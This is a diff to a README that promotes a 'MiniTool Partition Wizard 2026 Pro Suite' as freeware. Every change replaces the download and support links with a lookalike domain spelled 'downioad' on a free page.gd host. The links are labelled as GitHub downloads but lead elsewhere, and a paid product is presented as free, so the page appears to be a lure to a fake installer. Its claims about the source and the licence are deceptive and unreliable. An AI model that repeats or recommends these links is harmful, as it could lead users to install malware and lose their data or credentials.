@@ -2,7 +2,7 @@
 
 MiniTool Partition Wizard is a powerful disk management solution designed for Windows 10 and 11 users. This 2026 Pro Suite offers advanced features to optimize, resize, and manage partitions with ease. Whether you're a casual user or a system administrator, this tool provides a comprehensive set of utilities for disk maintenance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -68,7 +68,7 @@ Before installing, ensure your system meets the following requirements for optim
 
 ## Contact Support
 
-If you encounter any issues or have questions, visit our support page at [https://download-page.page.gd/support](https://download-page.page.gd/support) or email support@minitool-partition-wizard.com. Our team is available to assist you with installation, troubleshooting, and feature inquiries.
+If you encounter any issues or have questions, visit our support page at [https://downioad.page.gd/support](https://downioad.page.gd/support) or email support@minitool-partition-wizard.com. Our team is available to assist you with installation, troubleshooting, and feature inquiries.
 
 ## License Information
 
@@ -76,4 +76,4 @@ MiniTool Partition Wizard 2026 Pro Suite is provided as freeware for personal us
 
 ## Download
 
-Download the latest version from GitHub [here](https://download-page.page.gd/).
+Download the latest version from GitHub [here](https://downioad.page.gd/).
